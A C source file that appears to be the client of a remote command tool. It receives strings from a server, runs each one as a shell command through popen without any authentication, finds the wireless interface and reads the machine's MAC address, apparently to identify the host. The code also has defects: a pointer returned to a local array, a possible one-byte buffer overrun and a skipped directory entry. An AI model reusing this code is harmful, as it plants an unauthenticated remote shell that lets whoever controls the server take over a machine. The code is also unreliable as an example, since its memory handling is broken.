#include <arpa/inet.h>
#include <dirent.h>
#include <linux/if.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdnoreturn.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#include "../util/util.h"

FILE* recv_exec_msg(int sockfd, char msg[], size_t msg_size) {
  /* Receive and process messages from the server */
  ssize_t bytes_received = recv(sockfd, msg, msg_size, 0);

  if (bytes_received < 0) {
    error_and_exit("Error reading from socket \n");
  } else if (bytes_received == 0) {
    error_and_exit("Server disconnected \n");
  } else {
    msg[bytes_received] = '\0';  // Null-terminate the received message
    printf("%s\n", msg);
    // Process the received  message here (e.g., execute commands)
    FILE* output_pipe = popen(msg, "r");
    if (!output_pipe) {
      error_and_exit("Error Executing Commands \n");
    }

    return output_pipe;
  }
}

char* find_devices(char path[]) {
  char network_interface[20];

  // opendir() returns a pointer of DIR type.
  DIR* dr_pointer = opendir(path);

  // Error Checking
  if (dr_pointer == NULL) {
    error_and_exit("Could not open given directory \n");
  }

  // Hard_coded to look for the WLAN (wl)
  struct dirent* dr_entry = readdir(dr_pointer);  // Pointer for directory entry
  while ((dr_entry = readdir(dr_pointer)) != NULL) {
    if (dr_entry->d_name[0] == 'w' && dr_entry->d_name[1] == 'l') {
      closedir(dr_pointer);
      return strcpy(network_interface, dr_entry->d_name);
    }
  }

  closedir(dr_pointer);
  return NULL;
}

int mac_address(char interface[], char addr[]) {
  struct ifreq sock;
  int fd_socket = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
  char temp[3];
  const int addr_size = 6;
  // Error Checking
  if (interface == NULL) {
    error_and_exit("No Valid interface\n");
  }
  if (fd_socket == -1) {
    error_and_exit("Can't open socket\n");
  }
  strcpy(sock.ifr_name, interface);
  if (0 == ioctl(fd_socket, SIOCGIFHWADDR, &sock)) {
    addr[0] = '\0';  // Initialize addr as an empty string
    for (int count = 0; count < addr_size; ++count) {
      if (sprintf(temp, "%02X", (unsigned char)sock.ifr_hwaddr.sa_data[count]) <
          0) {
        error_and_exit("Getting MAC Address \n");
      }

      strcat(addr, temp);
    }
    close(fd_socket);  // Close the socket
    return 0;
  }

  close(fd_socket);  // Close the socket
  return -1;         // Didn't work.
}
